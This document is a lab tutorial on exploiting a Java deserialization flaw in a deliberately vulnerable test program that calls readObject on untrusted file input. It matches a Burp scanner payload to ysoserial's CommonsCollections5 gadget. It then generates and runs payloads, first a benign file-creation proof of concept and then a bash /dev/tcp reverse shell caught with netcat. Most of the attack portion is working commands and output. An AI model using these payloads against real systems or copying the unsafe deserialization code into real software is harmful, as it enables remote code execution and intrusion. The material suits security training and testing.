#### 3.1. Info

The following example will show how to exploit a deserialization vulnerability triggered via `readObject` method in a dummy test application.

Scenario:

- vulnerability was detected via Burp extension `https://github.com/federicodotta/Java-Deserialization-Scanner`
  - `Apache Commons Collections 3 Alternate payload 2 (Sleep)`

- exploit the vulnerability via `https://github.com/frohoff/ysoserial` 
  - this provides user-defined payloads (unlike benign `sleep` command)
  - `CommonsCollections5` payload is similar to Burp's


#### 3.2. Match the Burp scanner payload with the `yseoserial` gadget

```
# payload_str=`grep -r 'Commons Collections 3 Alternate payload 2 (Sleep)' ~/Java-Deserialization-Scanner | grep -oE '\"rO0AB.*\"' | tr -d '"' | tr -d '\n' | head -c 32`
# options=`java -jar ~/ysoserial.jar 2>&1 | grep -i 'commons-collections:3.1' | awk '{print $1}'`
# for i in $options; do java -jar ~/ysoserial.jar $i ls 2>/dev/null | base64 | grep -oE $payload_str && echo $i; done
rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50
CommonsCollections5
```
Note: this indicates that `CommonsCollections5` from `yseoserial` is the gadget identified to work with the target.


#### 3.3. Project setup (vulnerable application)

a) The following code `/tmp/java_serial/Main.java` simply reads a file that contains a serialized Java steam, attempts to re-build the original Java object:

```java
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        if (args.length != 1) return;
        String filename = args[0];
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object whatever = ois.readObject(); // hereby the vulnerable code
    }
}
```

b) After building `ysoserial` from source, all JAR dependencies that contain the required gadgets can be found under the local `maven` repository:
```
# find ~/.m2 -regex ".*commons.*collections.*3.1.*.jar" -exec cp -- "{}" /tmp/java_serial/ \;
```

c) Project structure:
```
# tree /tmp/java_serial/
/tmp/java_serial/
├── commons-collections-3.1.jar
└── Main.java

0 directories, 2 files
```

d) Compiling the program:
```
# cd /tmp/java_serial/
# javac Main.java # compile as regular Java program
# javac -cp commons-collections-3.1.jar: Main.java # in case classes from JAR file are imported in the Java program
```


#### 3.4. Exploitation - part 1 (benign payload)

Note:
- it is enough to provide the gadget's JAR dependency as part of the Java Class Path when running the application (similar to WebLogic)
- after running the program, successful exploitation creates `/tmp/test_serial` file

a) Generate the `ysoserial` payload for `CommonsCollections5`:
```
# java -jar ~/ysoserial.jar CommonsCollections5 'touch /tmp/test_serial' > /tmp/java_serial/collections5.serial
```

b) Exploitation - PoC:
```
# file /tmp/test_serial
/tmp/test_serial: cannot open `/tmp/test_serial' (No such file or directory)
# java -cp commons-collections-3.1.jar: Main collections5.serial
# file /tmp/test_serial
/tmp/test_serial: empty
```


#### 3.5. Exploitation - part 2 (reverse shell)

Note: remember to patch `ysoserial` - `CommonsCollections5.java` before running complex commands as part of your payload.

a) Generate the `ysoserial` payload for `CommonsCollections5`:
```
# java -jar ~/ysoserial.jar CommonsCollections5 "/bin/bash -i >& /dev/tcp/127.0.0.1/9999 0>&1" > /tmp/java_serial/collections5.serial
```

b) Exploitation - PoC:
```
# java -cp commons-collections-3.1.jar: Main collections5.serial
# nc -nlvp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48560
...
```
